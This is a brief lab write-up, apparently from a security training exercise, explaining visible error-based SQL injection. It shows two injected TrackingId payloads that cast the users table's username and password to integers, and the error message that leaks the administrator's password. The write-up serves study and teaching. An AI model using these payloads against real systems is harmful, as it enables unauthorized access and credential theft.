# Visible error-based SQL injection

So for this lab, whenever we change the trackingID part of the HTTP request to the server it is nice enough to return us a nifty error message.

1. TrackingId=ogAZZfxtOKUELbuJ' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--

This is our first query, we are basically trying to cast the first row of the username column (which turns out to be 'administrator' into an INT to TRY AND GET AN ERROR.

2. TrackingId=ogAZZfxtOKUELbuJ' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--

Notice we do the exact same thing for the password as well. After submitting this HTTP request we get the error:

    ERROR: invalid input syntax for type integer: "2yifk2rzstacge4lwekn"

We tricked the server into giving us the password! This works because we attempted to cast this value into an INT and in the error response they returned to us the password.
